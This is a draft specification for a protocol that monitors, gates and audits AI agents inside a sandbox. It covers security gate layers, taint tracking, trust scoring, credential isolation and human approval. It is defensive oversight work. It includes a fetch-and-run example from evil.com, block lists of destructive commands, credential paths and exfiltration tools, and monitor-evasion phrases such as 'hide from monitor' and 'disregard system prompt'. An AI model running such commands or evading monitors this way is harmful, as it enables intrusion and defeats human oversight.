# AMP Protocol Specification v1.0

**Agent Monitoring Protocol**

**Status:** Draft
**Version:** 1.0.0
**Last Updated:** 2025-03

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Architecture](#2-architecture)
3. [Boundary Model](#3-boundary-model)
4. [Event System](#4-event-system)
5. [Security Gate](#5-security-gate)
6. [LLM Proxy & Credential Isolation](#6-llm-proxy--credential-isolation)
7. [Human-in-the-Loop (HITL)](#7-human-in-the-loop-hitl)
8. [Agent Lifecycle](#8-agent-lifecycle)
9. [Sensitive Data Vault](#9-sensitive-data-vault)
10. [API Reference](#10-api-reference)
11. [Message Schemas](#11-message-schemas)
12. [Sequence Diagrams](#12-sequence-diagrams)
13. [Integration Guide](#13-integration-guide)
14. [Best Practices](#14-best-practices)

---

## 1. Introduction

### 1.1 What is AMP?

AMP (Agent Monitoring Protocol) is a structured boundary protocol between AI agents and their sandbox platform. It is the core innovation of Paddock.

AMP is **not** an agent framework. It is **not** a model protocol. It defines:

- How tool calls are **monitored** and **gated**
- How agent behavior is **reviewed** and **scored**
- How events are **reported**, **stored**, and **audited**
- How external capabilities are **explicitly surfaced** across boundaries
- How snapshots and rollbacks **correlate** with commands and events

### 1.2 Design Philosophy

AMP's goal is not to control the agent's thinking — it is to control the **boundary between the agent and the environment**.

**Core principles:**

1. **Full Environment, Not Castrated Environment** — The agent runs in a complete Linux system, not a restricted shell. Capabilities are preserved; boundaries are enforced at the protocol layer.
2. **Capability Stays Inside, Boundary Stays Explicit** — Local tools (file I/O, exec, browser) operate inside the sandbox. Anything that crosses the sandbox boundary must go through an explicit protocol interface.
3. **Observable by Default** — Every critical action generates a structured event. No silent operations.
4. **Gated, Not Blocked** — The default posture is to evaluate, not to block. Deterministic rules catch known dangers; behavior analysis catches novel patterns; HITL catches edge cases.
5. **Agent-Agnostic** — AMP works with any agent framework. OpenClaw is the reference implementation, but AMP adapters can be built for LangChain, AutoGPT, or custom agents.

### 1.3 Design Goals

| Goal | Target |
|------|--------|
| Security First | Multi-layer defense: deterministic rules, taint tracking, behavior analysis, trust scoring |
| Zero-Trust | API keys never enter the sandbox; all tool calls are gated |
| Observable | Every agent action generates structured events for audit and analysis |
| Extensible | Plugin architecture supports any agent framework |
| Human Oversight | Built-in HITL system for high-risk operations |

---

## 2. Architecture

AMP operates across three architectural layers:

### 2.1 Control Plane (Host)

The Control Plane runs on the host machine and orchestrates all sessions.

```
Control Plane (:3100)
├── Session Manager      — Create, start, pause, terminate sessions
├── Event Store          — SQLite + SHA-256 hash chain
├── LLM Relay            — Inject API keys, forward to real LLM APIs
├── HITL Arbiter         — Policy-based approval engine
├── Snapshot Manager     — VM snapshot creation and restoration
├── Cron Manager         — Scheduled agent actions
├── MCP Gateway          — External capability routing
├── Resource Gateway     — Resource boundary enforcement
├── REST API             — HTTP endpoints for Dashboard + integrations
└── WebSocket Streams    — Real-time event streaming
```

**Technology stack:** Node.js, Fastify, SQLite (better-sqlite3), BoxLite SDK

### 2.2 Sidecar (Inside Sandbox)

The Sidecar runs inside the MicroVM alongside the agent process.

```
Sidecar
├── LLM Proxy (:8800)    — Intercepts agent LLM requests
│   ├── Adversarial Detection  — Scans for bypass attempts
│   ├── Sensitive Data Vault   — Masks secrets before reaching LLM
│   └── Intent Extraction      — Extracts tool intents from LLM responses
├── AMP Gate (:8801)     — Policy gate for tool call approval
│   ├── Rule Engine       — Deterministic pattern matching
│   ├── Taint Tracker     — Data flow security labels
│   ├── Behavior Analyzer — Sequence pattern detection
│   └── Trust Scorer      — Session-level trust decay
├── Event Reporter       — Sends events to Control Plane via HTTP
├── FS Watcher           — Monitors file system changes in workspace
├── Agent Monitor        — Tracks agent process health and lifecycle
└── Control Plane Client — Communication channel to host
```

**Technology stack:** Node.js, native HTTP server, Chokidar, process monitoring

### 2.3 Agent (Inside Sandbox)

The agent is the AI agent framework running inside the sandbox.

**Currently supported:** OpenClaw (reference implementation)

**Integration points:**
- **LLM Requests** → `http://localhost:8800/{provider}` (LLM Proxy)
- **Tool Calls** → `POST /amp/gate` (AMP Gate for approval)
- **Lifecycle Events** → `/amp/agent/*` (ready, error, exit)
- **User Commands** → `/tmp/paddock-commands.jsonl` (command file polling)

---

## 3. Boundary Model

AMP classifies every tool and capability into one of four boundary types. This classification determines how the operation is monitored, gated, and routed.

### 3.1 `sandbox-local`

Operations completed entirely inside the guest VM.

| Tool | Description |
|------|-------------|
| `read` | Read sandbox files |
| `write` | Write sandbox files |
| `edit` | Edit sandbox files |
| `apply_patch` | Patch sandbox files |
| `exec` | Execute commands in the VM |
| `process` | Manage background processes |
| `browser` | Drive the VM-local browser |
| `web_search` | Perform web searches from inside the VM |
| `web_fetch` | Fetch remote web content from inside the VM |
| `memory_search` | Search local agent memory |
| `memory_get` | Read local agent memory |
| `image` | Analyze local images |
| `pdf` | Analyze local PDFs |
| `agents_list` | Inspect local agent configuration |

**Rules:**
- Completed inside the guest VM, never falls back to host
- Gated by `POST /amp/gate` before execution
- Results reported via `POST /amp/event` after execution
- Monitor layer: `amp-gate`

### 3.2 `control-plane-routed`

Operations that appear local to the agent but whose ground truth is maintained by the Control Plane.

| Tool | Description |
|------|-------------|
| `sessions_list` | List Paddock sessions |
| `sessions_history` | Read session history |
| `sessions_send` | Send command to another session |
| `sessions_spawn` | Spawn a sub-agent session |
| `sessions_yield` | Yield until sub-agent completes |
| `session_status` | Read session status |
| `subagents` | Manage spawned sub-agents |
| `cron` | Schedule future agent actions |
| `rollback` | Restore a checkpoint or snapshot |

**Rules:**
- Agent can use these tools
- Sandbox never privately maintains global state
- Monitor layer: `amp-control`

### 3.3 `mcp-external`

Operations that truly leave the sandbox and depend on the host machine or external services.

| Tool Pattern | Description |
|-------------|-------------|
| `message` | Send outbound channel messages |
| `canvas` | Drive host or remote canvas surfaces |
| `nodes` | Reach host-attached or remote nodes/devices |
| `tts` | Use external text-to-speech delivery |
| `browser.*` | Host-side browser bridge operations |
| `clipboard.*` | Host clipboard operations |
| `tts.*` | External TTS operations |
| `applescript.*` | Host AppleScript operations |
| `channel.*` | Outbound channel operations |
| `api.*` | Credential-backed external APIs |

**Rules:**
- Must explicitly cross the boundary
- Host permissions are never silently leaked
- Monitor layer: `mcp`

### 3.4 `disabled`

Capabilities that are not allowed inside the sandbox.

| Tool | Reason |
|------|--------|
| `gateway` | Gateway self-administration is disabled inside sandboxes |

### 3.5 Boundary Classification Algorithm

```typescript
function classifyToolBoundary(toolName: string): Boundary {
  // 1. Check exact match table
  if (EXACT_BOUNDARIES.has(toolName)) return EXACT_BOUNDARIES.get(toolName);

  // 2. Check prefix match table
  for (const { prefix, boundary } of PREFIX_BOUNDARIES) {
    if (toolName.startsWith(prefix)) return boundary;
  }

  // 3. Default: disabled
  return 'disabled';
}
```

---

## 4. Event System

### 4.1 Event Types

AMP defines structured event types across six categories:

#### Intent Layer (LLM & Tool Planning)

| Event Type | Description |
|-----------|-------------|
| `llm.request` | Agent sends LLM request (model, provider, message count, tool count) |
| `llm.response` | LLM returns response (tokens in/out, duration, content preview) |
| `tool.intent` | Agent declares tool call intent (tool name, input, correlation ID) |
| `tool.result` | Tool execution result |
| `agent.thought` | Agent reasoning/thinking block, including optional intent self-description |

#### Effect Layer (Observable Actions)

| Event Type | Description |
|-----------|-------------|
| `amp.fs.change` | File system modification detected |
| `amp.net.egress` | Outbound network request |
| `amp.process.spawn` | New process spawned |

#### System Layer (Session Management)

| Event Type | Description |
|-----------|-------------|
| `amp.session.start` | Session created and started (includes deployment phases) |
| `amp.session.end` | Session terminated |
| `amp.snapshot.created` | VM snapshot created |
| `amp.snapshot.restored` | VM restored from snapshot |

#### HITL Layer (Human Oversight)

| Event Type | Description |
|-----------|-------------|
| `amp.hitl.request` | Tool call requires human approval |
| `amp.hitl.decision` | User approved / rejected / modified |

#### Security Layer (Policy Enforcement)

| Event Type | Description |
|-----------|-------------|
| `amp.gate.verdict` | Security gate decision (verdict, risk score, triggered rules) |

#### Agent Lifecycle Layer

| Event Type | Description |
|-----------|-------------|
| `amp.agent.ready` | Agent initialized and ready |
| `amp.agent.heartbeat` | Periodic health check |
| `amp.agent.error` | Recoverable error occurred |
| `amp.agent.fatal` | Fatal error, agent will exit |
| `amp.agent.exit` | Agent process terminated |

#### User Layer

| Event Type | Description |
|-----------|-------------|
| `amp.user.command` | User sent command from Dashboard |

### 4.2 Event Format

All events follow the `AMPEvent` schema:

```typescript
interface AMPEvent {
  id: string;              // Unique event ID (nanoid)
  sessionId: string;       // Session identifier
  seq: number;             // Monotonic sequence number
  timestamp: number;       // Unix timestamp (ms)
  type: AMPEventType;      // Event type
  payload: Record<string, unknown>;  // Event-specific data
  correlationId?: string;  // Links related events (e.g., tool intent → verdict → result)
  causedBy?: string;       // Parent event ID
  snapshotRef?: string;    // Snapshot ID if applicable
}
```

### 4.3 Event Storage & Integrity

Events are stored in SQLite with cryptographic integrity:

```sql
CREATE TABLE events (
  id             TEXT PRIMARY KEY,
  session_id     TEXT NOT NULL,
  seq            INTEGER NOT NULL,
  timestamp      INTEGER NOT NULL,
  type           TEXT NOT NULL,
  payload        TEXT NOT NULL,     -- JSON
  correlation_id TEXT,
  caused_by      TEXT,
  snapshot_ref   TEXT,
  prev_hash      TEXT,              -- Hash of previous event
  hash           TEXT,              -- Hash of this event
  rolled_back    INTEGER DEFAULT 0  -- Marked during rollback
);
```

**Hash chain formula:**

```
hash = SHA256(prev_hash + id + seq + type + payload)
```

This creates an immutable audit trail. If any event is tampered with, the hash chain breaks and the integrity violation is detectable.

### 4.4 Event Flow

```
Agent performs action
  → Sidecar intercepts
    → Policy Gate evaluates (4 layers)
      → If approved: execute + report event to Control Plane
      → If ask: HITL request → wait for human decision
      → If reject: block + report verdict event
    → Control Plane appends to Event Store with hash
      → Dashboard receives via WebSocket stream
```

---

## 5. Security Gate

The Policy Gate is AMP's core security mechanism. Every tool call must pass through it before execution.

### 5.1 Layer 1: Deterministic Rule Engine

Pattern-based evaluation of tool name and arguments:

- **Command injection detection**: backticks, `$(...)`, subshells
- **Path traversal prevention**: `..` sequences, symlink escapes
- **URL validation**: blocks localhost, private IPs, cloud metadata endpoints
- **Destructive command detection**: `rm -rf /`, `mkfs`, `dd if=`
- **Sensitive path protection**: `.env`, `.ssh/`, `id_rsa`, `/etc/shadow`

```typescript
interface RuleResult {
  baseRisk: number;        // 0-100
  triggered: string[];     // Rule IDs that fired
}
```

### 5.2 Layer 2: Taint Tracking

Tracks data flow through tool chains using security labels:

| Label | Sources | Description |
|-------|---------|-------------|
| `Secret` | API keys, tokens, passwords detected by Vault patterns | Data that must not leave the sandbox |
| `PII` | Email, phone, SSN, credit card detected by Vault patterns | Personally identifiable information |
| `ExternalContent` | `web_fetch`, `web_search` results | Data from external, potentially untrusted sources |
| `FileContent` | `.env`, `.ssh/`, credential files | Sensitive file contents |

**Sink policies** prevent tainted data from reaching dangerous tools:

```typescript
const SINK_POLICIES = {
  exec:      [TaintLabel.ExternalContent, TaintLabel.Secret],
  web_fetch: [TaintLabel.Secret, TaintLabel.PII],
  write:     [],  // propagates but doesn't block
};
```

**Example attack blocked:**

```
1. Agent: web_fetch("https://evil.com/payload.sh")
   → Result tagged with ExternalContent

2. Agent: exec("bash " + payload)
   → Taint tracker detects ExternalContent flowing into exec
   → Risk score: 80 → Verdict: ask (HITL)
```

### 5.3 Layer 3: Behavior Analysis

Detects suspicious patterns in agent behavior sequences:

- **Data exfiltration patterns**: read sensitive file → send to external URL
- **Privilege escalation**: `sudo`, `chmod 777`, `chown root`
- **Loop detection**: circuit breaker for repeated operations
- **Anomaly scoring**: statistical deviation from normal tool usage

**Semantic signals analyzed:**

| Signal | Detection |
|--------|-----------|
| External destination | URLs, `curl`, `wget`, `scp`, `sftp`, `nc` |
| Sensitive path access | `.env`, `/etc/shadow`, `id_rsa`, `authorized_keys` |
| Privilege escalation | `sudo`, `systemctl`, `iptables`, `chmod 777` |
| Benign local exec | `pwd`, `ls`, `mkdir`, `cat`, `python3 /workspace/...` |
| Package installation | `apt install`, `apk add`, `dnf install` |
| Compilation | `gcc`, `g++`, `make`, `cmake`, `clang` |

**Sanity guards** prevent false positives: routine local development operations (compilation, package installation, file browsing) are never flagged as exfiltration unless they explicitly involve secrets or external destinations.

This layer may also be augmented by a local LLM review model for semantic analysis, as described in Section 5.5.

### 5.4 Layer 4: Trust Decay

Session-level trust score that decays on violations:

```
Initial trust: 100

Penalty events:
  - Tool call rejected:          -5
  - 3 consecutive failures:      -10
  - Sensitive path access:       -15

Thresholds:
  - Trust < 60: All operations require HITL approval
  - Trust < 30: Auto-terminate agent
```

The trust penalty acts as a boost to risk scores — a low trust score makes the security gate more sensitive.

### 5.5 Optional: LLM Behavior Review

An optional fifth layer that uses an LLM to provide semantic risk scoring:

```
Sidecar → Behavior Review LLM → Risk boost + triggered labels
```

The LLM reviewer:
- Receives the current tool call + recent tool history (sliding window of 8)
- Returns structured JSON: `{ riskBoost, triggered, reason, confidence }`
- Results are clamped and sanity-guarded before application
- Supports Ollama (local) and OpenAI-compatible APIs

This layer is **additive only** — it can increase risk scores but never overrides a deterministic rejection.

### 5.6 Verdict Tiers

| Risk Score | Verdict | Action |
|------------|---------|--------|
| 0–30 | `approve` | Execute immediately |
| 31–70 | `approve` | Execute with alert (logged but not blocked) |
| 71–90 | `ask` | HITL approval required; agent blocks until human decides |
| 91–100 | `reject` | Block execution; agent receives rejection reason |

---

## 6. LLM Proxy & Credential Isolation

### 6.1 Architecture

```
Agent (sandbox)          Sidecar (sandbox)         Control Plane (host)     LLM API
     │                        │                          │                    │
     │── POST /anthropic ────►│                          │                    │
     │   /v1/messages         │                          │                    │
     │   (dummy API key)      │                          │                    │
     │                        │── Adversarial scan ──►   │                    │
     │                        │── Vault: mask secrets ─► │                    │
     │                        │── Forward to CP ────────►│                    │
     │                        │   (no real API key)      │── Inject real ────►│
     │                        │                          │   API key          │
     │                        │                          │◄── LLM response ──│
     │                        │◄── response ────────────│                    │
     │                        │── Vault: unmask ────►    │                    │
     │◄── response ──────────│                          │                    │
     │                        │                          │                    │
     │                        │── Report llm.request ───►│                    │
     │                        │── Report llm.response ──►│                    │
```

### 6.2 Security Layers

**Layer 0: Adversarial Detection**

Scans agent messages for bypass attempts:

```
Detected patterns:
  - "ignore paddock"
  - "don't declare intent"
  - "hide from monitor"
  - "disregard system prompt"
  - "override instructions"
  - "pretend you are"
  - "always say routine"
```

Detections are reported as `amp.gate.verdict` events but do not block the request.

**Layer 1: Sensitive Data Vault**

The Vault scans outbound LLM requests for sensitive data and replaces it with placeholders:

```
Agent sends:  "My API key is sk-ant-api03-abc123..."
LLM receives: "My API key is {{PADDOCK_SECRET_1}}"
LLM responds: "I see your key is {{PADDOCK_SECRET_1}}"
Agent gets:   "I see your key is sk-ant-api03-abc123..."
```

The LLM **never sees real secrets**. The Event Store **never records real secrets**. The Dashboard **never displays real secrets**.

Detected categories: API keys (Anthropic, OpenAI, OpenRouter, GitHub, AWS, Slack, Discord, Telegram), SSH private keys, PGP keys, database connection strings, passwords, JWTs, Bearer tokens, PII (email, phone, credit card, SSN).

**Layer 2: API Key Isolation**

API keys are stored on the host and **never enter the sandbox**.

- Agent uses `api_key="paddock-proxy"` (dummy)
- LLM Proxy strips any authorization headers from the request
- Control Plane injects the real key when forwarding to the LLM provider

### 6.3 Supported Providers

| Provider | Proxy Path | Auth Header | Env Variable |
|----------|-----------|-------------|-------------|
| Anthropic | `/anthropic` | `x-api-key` | `ANTHROPIC_API_KEY` |
| OpenAI | `/openai` | `Authorization` | `OPENAI_API_KEY` |
| OpenRouter | `/openrouter` | `Authorization` | `OPENROUTER_API_KEY` |
| Google | `/google` | `x-goog-api-key` | `GOOGLE_API_KEY` |

### 6.4 Intent Extraction

The LLM Proxy extracts tool intents from LLM responses and reports them as `tool.intent` events. This enables pre-execution analysis:

- For Anthropic-style responses: extracts `tool_use` blocks and `thinking` blocks
- For OpenAI-style responses: extracts `function` / `tool_calls` blocks
- Supports both JSON and SSE (streaming) response formats

### 6.5 Optional: Intent Injection

AMP also defines an optional intent-injection pattern for richer observability. In this mode, the adapter or proxy appends a structured instruction to the model prompt asking the model to explicitly describe:

- its current objective
- the intended tool or action
- the reason for choosing that action
- any claimed boundary assumptions or safety posture

The model's self-declared intent is treated as **supplemental evidence**, not as the source of truth. Actual tool payloads, gate verdicts, and observed effects remain authoritative.

Intent injection can enrich `agent.thought` and `tool.intent` events, improve human review quality, and provide additional context to downstream behavior analyzers. It is an optional protocol capability and may be implemented natively by an AMP adapter rather than by the LLM Proxy alone.

---

## 7. Human-in-the-Loop (HITL)

### 7.1 Flow

```
Agent → tool_use → Sidecar → Policy Gate → risk score 71-90
                                              ↓
                                    amp.hitl.request event
                                              ↓
                              Control Plane → Dashboard notification
                                              ↓
                                    User: Approve / Reject / Modify
                                              ↓
                                    amp.hitl.decision event
                                              ↓
                                    Sidecar → proceed or block
```

### 7.2 HITL Policies

Configurable per-tool approval policies:

```typescript
interface HITLPolicy {
  toolPattern: string;  // Supports wildcards: 'exec', 'host.*'
  action: 'approve' | 'block' | 'ask';
}

// Default policies
const DEFAULT_POLICIES: HITLPolicy[] = [
  { toolPattern: 'read',       action: 'approve' },
  { toolPattern: 'edit',       action: 'approve' },
  { toolPattern: 'write',      action: 'approve' },
  { toolPattern: 'exec',       action: 'ask' },
  { toolPattern: 'web_search', action: 'approve' },
  { toolPattern: 'web_fetch',  action: 'approve' },
  { toolPattern: 'browser',    action: 'ask' },
  { toolPattern: 'host.*',     action: 'ask' },
];
```

### 7.3 HITL Request Format

```typescript
interface HITLRequest {
  id: string;
  sessionId: string;
  toolName: string;
  toolArgs: Record<string, unknown>;
  reason: string;
  riskScore?: number;
  triggeredRules?: string[];
  timestamp: number;
}
```

### 7.4 HITL Decision Format

```typescript
interface HITLDecision {
  requestId: string;
  verdict: 'approved' | 'rejected' | 'modified';
  modifiedArgs?: Record<string, unknown>;
  decidedAt: number;
}
```

### 7.5 Timeout

HITL requests time out after **5 minutes**. Timed-out requests are automatically **rejected**.

---

## 8. Agent Lifecycle

### 8.1 Lifecycle States

```
Created → Running → Ready → Active → (Error) → Exit
```

| State | Description |
|-------|-------------|
| **Created** | Session created, VM not yet started |
| **Running** | VM started, Sidecar initializing |
| **Ready** | Agent reported ready via `amp.agent.ready` |
| **Active** | Agent executing tasks |
| **Error** | Recoverable error occurred |
| **Exit** | Agent terminated (normal or crash) |

### 8.2 Registration Sequence

1. Control Plane starts VM with environment variables
2. Sidecar initializes: resolves Control Plane URL, starts LLM Proxy (:8800), starts AMP Gate (:8801)
3. Agent starts inside VM
4. Agent reports ready via AMP adapter: `POST /amp/agent/ready`
5. Dashboard receives `amp.agent.ready` event

### 8.3 Heartbeat

The Agent Monitor sends periodic heartbeats:

- **Heartbeat interval:** every 30 seconds
- **Liveness check:** every 10 seconds via `pgrep`
- **Payload:** agent name, uptime, memory usage, pending tasks

### 8.4 Error Reporting

```typescript
interface AMPAgentError {
  category: 'config' | 'network' | 'auth' | 'resource' | 'runtime' | 'dependency';
  code: string;        // e.g., 'ERR_NO_API_KEY'
  message: string;
  recoverable: boolean;
  context?: Record<string, unknown>;
}
```

| Code | Category | Description | Recoverable |
|------|----------|-------------|-------------|
| `ERR_NO_API_KEY` | auth | API key not configured | No |
| `ERR_RATE_LIMIT` | resource | Rate limit exceeded | Yes |
| `ERR_LLM_UNAVAILABLE` | network | LLM API unreachable | Yes |
| `ERR_LLM_UPSTREAM` | runtime | LLM API error | Maybe |
| `ERR_TOOL_BLOCKED` | security | Tool blocked by policy | No |
| `ERR_TOOL_EXEC` | runtime | Tool execution failed | Yes |
| `ERR_AGENT_CRASH` | runtime | Agent crashed | No |

### 8.5 Crash Detection

If the agent process disappears (detected via `pgrep`), the Agent Monitor reports:

```typescript
{
  type: "amp.agent.exit",
  payload: { agent: "openclaw", exitCode: -1, reason: "crash" }
}
```

---

## 9. Sensitive Data Vault

### 9.1 Overview

The Sensitive Data Vault is a bidirectional filter in the LLM Proxy that ensures secrets never reach the LLM and never appear in event logs.

### 9.2 Detection Patterns

Patterns are ordered by specificity (priority 10 = highest):

| Category | Pattern | Priority |
|----------|---------|----------|
| Anthropic API Key | `sk-ant-*` | 10 |
| OpenAI API Key | `sk-proj-*`, `sk-*` | 10 |
| OpenRouter API Key | `sk-or-*` | 10 |
| GitHub Token | `ghp_*`, `ghs_*`, `github_pat_*` | 10 |
| AWS Access Key | `AKIA*` | 10 |
| SSH Private Key | `-----BEGIN * PRIVATE KEY-----` | 10 |
| PGP Private Key | `-----BEGIN PGP PRIVATE KEY BLOCK-----` | 10 |
| JWT | `eyJ*.eyJ*.*` | 9 |
| DB Connection String | `mongodb://`, `postgres://`, `redis://` | 9 |
| Bearer Token | `Bearer *` | 8 |
| Credit Card | Luhn-valid patterns | 8 |
| SSN | `NNN-NN-NNNN` | 8 |
| Password Field | Common key-value patterns | 7 |
| Email | Standard email regex | 3 |
| Phone | Standard phone regex | 3 |

### 9.3 Masking Flow

```
Outbound (Agent → LLM):
  1. Scan request body against all patterns
  2. Replace matches with {{PADDOCK_SECRET_N}}
  3. Store mapping in memory (never leaves VM)
  4. Forward masked body to Control Plane

Inbound (LLM → Agent):
  1. Scan response for {{PADDOCK_SECRET_N}} placeholders
  2. Restore original values
  3. Return to agent with secrets intact
```

### 9.4 Allowlist

Certain values that look like secrets but aren't are allowlisted:

- `paddock-proxy` (dummy API key)
- `localhost`, `host.internal`
- `true`, `false`, `null`, `undefined`

---

## 10. API Reference

### 10.1 Control Plane REST API (`:3100`)

#### Session Management

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/sessions` | Create a new session |
| `GET` | `/api/sessions` | List all sessions |
| `GET` | `/api/sessions/:id` | Get session details |
| `POST` | `/api/sessions/:id/start` | Start a session (launches VM) |
| `POST` | `/api/sessions/:id/stop` | Stop a session |
| `POST` | `/api/sessions/:id/deploy-agent` | Deploy an agent into a running session |
| `DELETE` | `/api/sessions/:id` | Delete a session |
| `POST` | `/api/sessions/:id/command` | Send command to agent |
| `POST` | `/api/sessions/:id/commands/abort` | Abort a running command |

#### Event Management

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/sessions/:id/events` | Get events for a session |
| `POST` | `/api/sessions/:id/events` | Append event (used by Sidecar) |
| `WS` | `/ws/sessions/:id` | WebSocket stream of real-time events |

#### HITL Management

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/sessions/:id/hitl/pending` | Get pending HITL requests |
| `POST` | `/api/sessions/:id/hitl` | Submit HITL decision |

#### Snapshot Management

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/sessions/:id/snapshots` | Create a snapshot |
| `GET` | `/api/sessions/:id/snapshots` | List snapshots |
| `POST` | `/api/sessions/:id/snapshots/:snapshotId/restore` | Restore from snapshot |

#### Configuration

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/health` | Health check (includes configured providers, warnings) |
| `GET` | `/api/config/llm` | Get LLM provider configuration |
| `POST` | `/api/config/llm` | Update LLM API keys |

### 10.2 Sidecar API (`:8801`)

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/amp/gate` | Evaluate tool call through security gate |
| `POST` | `/amp/agent/ready` | Agent reports ready |
| `POST` | `/amp/agent/error` | Agent reports error |
| `POST` | `/amp/agent/exit` | Agent reports exit |
| `POST` | `/amp/event` | Report custom event |
| `POST` | `/amp/command` | Receive user command (from Control Plane) |
| `GET` | `/amp/health` | Sidecar health check |

### 10.3 LLM Proxy (`:8800`)

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/anthropic/*` | Proxy to Anthropic API |
| `POST` | `/openai/*` | Proxy to OpenAI API |
| `POST` | `/openrouter/*` | Proxy to OpenRouter API |
| `POST` | `/google/*` | Proxy to Google API |

### 10.4 Port Reference

| Port | Service | Description |
|------|---------|-------------|
| 3100 | Control Plane | REST API and WebSocket |
| 3200 | Dashboard | Web UI (dev server) |
| 8800 | LLM Proxy | Sidecar LLM proxy (inside VM) |
| 8801 | AMP Gate | Sidecar policy gate (inside VM) |
| 6080 | noVNC HTTP | Computer-box GUI access |
| 6443 | noVNC HTTPS | Computer-box GUI access (secure) |

---

## 11. Message Schemas

### 11.1 Gate Request & Verdict

```typescript
interface AMPGateRequest {
  correlationId: string;
  toolName: string;
  toolInput: Record<string, unknown>;
}

interface AMPGateVerdict {
  verdict: 'approve' | 'reject' | 'ask';
  riskScore: number;          // 0-100
  triggeredRules: string[];   // Rule IDs that fired
  behaviorFlags?: string[];   // Behavior analysis flags
  reason?: string;            // Human-readable explanation
}
```

### 11.2 Session

```typescript
interface Session {
  id: string;
  status: 'created' | 'running' | 'paused' | 'terminated' | 'error';
  agentType: string;
  sandboxType: 'simple-box' | 'computer-box';
  createdAt: number;
  updatedAt: number;
  vmId?: string;
  guiPorts?: { httpPort: number; httpsPort: number };
  agentConfig?: { provider: string; model: string };
}
```

### 11.3 Taint Types

```typescript
enum TaintLabel {
  Secret = 'Secret',
  PII = 'PII',
  ExternalContent = 'ExternalContent',
  FileContent = 'FileContent',
}

interface TaintEntry {
  value: string;
  labels: Set<TaintLabel>;
  source: string;
  firstSeen: number;
}
```

### 11.4 Trust Profile

```typescript
interface TrustProfile {
  score: number;          // 0-100
  anomalyCount: number;
  penaltyBoost: number;   // Added to risk scores
}
```

---

## 12. Sequence Diagrams

### 12.1 Session Startup

```
User        Dashboard     Control Plane   Sandbox Driver   VM / Sidecar    Agent
 │               │               │               │               │           │
 │── Create ────►│               │               │               │           │
 │               │── POST ──────►│               │               │           │
 │               │  /sessions    │               │               │           │
 │               │◄── Session ──│               │               │           │
 │               │               │               │               │           │
 │── Start ─────►│               │               │               │           │
 │               │── POST ──────►│               │               │           │
 │               │  /start       │── createVM ──►│               │           │
 │               │               │               │── start VM ──►│           │
 │               │               │               │               │── init ──►│
 │               │               │               │               │◄─ ready ─│
 │               │               │◄── vmId ─────│               │           │
 │               │               │── event ─────►│               │           │
 │               │◄── Session ──│               │               │           │
 │◄── Started ──│               │               │               │           │
```

### 12.2 Tool Call with Policy Gate

```
Agent        Sidecar / Gate   Control Plane   Dashboard / User
 │               │                  │                │
 │── tool_use ──►│                  │                │
 │               │── evaluate ──►   │                │
 │               │  (4 layers)      │                │
 │               │◄── verdict ──    │                │
 │               │                  │                │
 │  [if risk > 70]                  │                │
 │               │── hitl.request ─►│                │
 │               │                  │── notify ─────►│
 │               │                  │◄── decision ──│
 │               │◄── approved ────│                │
 │               │                  │                │
 │◄── approved ─│                  │                │
 │── execute ──►│                  │                │
 │◄── result ──│                  │                │
 │               │── tool.result ──►│                │
```

### 12.3 LLM Request Flow

```
Agent        Sidecar / Proxy    Control Plane / Relay    LLM API
 │               │                      │                  │
 │── POST /anthropic/v1/messages ──────►│                  │
 │   (dummy API key)                    │                  │
 │               │── adversarial scan   │                  │
 │               │── vault: mask ──────►│                  │
 │               │── forward ──────────►│                  │
 │               │   (no real key)      │── inject key ──►│
 │               │                      │── POST ────────►│
 │               │                      │◄── response ───│
 │               │◄── response ────────│                  │
 │               │── vault: unmask      │                  │
 │◄── response ─│                      │                  │
 │               │                      │                  │
 │               │── llm.request ──────►│                  │
 │               │── llm.response ─────►│                  │
```

---

## 13. Integration Guide

### 13.1 Integrating a New Agent

AMP can be integrated with any agent framework. The reference implementation is the Python `paddock-amp` adapter.

**Step 1: Install AMP Adapter**

```bash
pip install paddock-amp
```

**Step 2: Initialize**

```python
from paddock_amp import PaddockAMPPlugin

plugin = PaddockAMPPlugin(
    sidecar_url="http://localhost:8801",
    agent_version="1.0.0"
)
```

**Step 3: Report Ready**

```python
plugin.report_ready(capabilities=["read", "write", "exec", "web_fetch"])
```

**Step 4: Gate Tool Calls**

```python
def execute_tool(tool_name: str, tool_input: dict) -> dict:
    # Request approval from Policy Gate
    verdict = plugin.before_tool_call(tool_name, tool_input)

    if verdict["verdict"] == "reject":
        raise ToolBlockedError(verdict["reason"])

    # Execute tool
    result = actual_tool_execution(tool_name, tool_input)

    # Report result for taint tracking
    plugin.after_tool_call(tool_name, result)

    return result
```

**Step 5: Proxy LLM Requests**

```python
from anthropic import Anthropic

client = Anthropic(
    api_key="paddock-proxy",  # Dummy key — real key injected by Control Plane
    base_url="http://localhost:8800/anthropic"
)
```

**Step 6: Poll for User Commands**

```python
plugin.on_command(lambda cmd: print(f"User command: {cmd}"))
plugin.start_command_polling(interval=1.0)
```

**Step 7: Handle Errors & Exit**

```python
import atexit

try:
    agent.run()
except Exception as e:
    plugin.report_error({
        "category": "runtime",
        "code": "ERR_AGENT_CRASH",
        "message": str(e),
        "recoverable": False
    })
    raise
finally:
    plugin.report_exit(exit_code=0, reason="normal")

atexit.register(lambda: plugin.report_exit(0, "normal"))
```

### 13.2 Environment Variables

Required inside the sandbox:

| Variable | Description | Default |
|----------|-------------|---------|
| `PADDOCK_SESSION_ID` | Unique session identifier | (required) |
| `PADDOCK_CONTROL_URL` | Control Plane URL | `http://host.docker.internal:3100` |
| `PADDOCK_SIDECAR_URL` | Sidecar URL | `http://localhost:8801` |
| `PADDOCK_WATCH_DIR` | Workspace directory | `/workspace` |
| `PADDOCK_AGENT_NAME` | Agent name for logging | `openclaw` |
| `PADDOCK_AGENT_PROCESS` | Process pattern for liveness checks | `openclaw` |

---

## 14. Best Practices

### 14.1 Security

- **Never hardcode API keys** in agent code — use the LLM Proxy
- **Use `/workspace`** as root directory — validate all file paths
- **Block `..` in paths** — use symlink-safe path resolution
- **Start with strict HITL policies** — gradually relax based on observed behavior
- **Review HITL logs regularly** — update policies based on incidents

### 14.2 Performance

- Taint tracker: limit to **500 entries**
- Use connection pooling for Control Plane communication
- Use correlation IDs to group related events

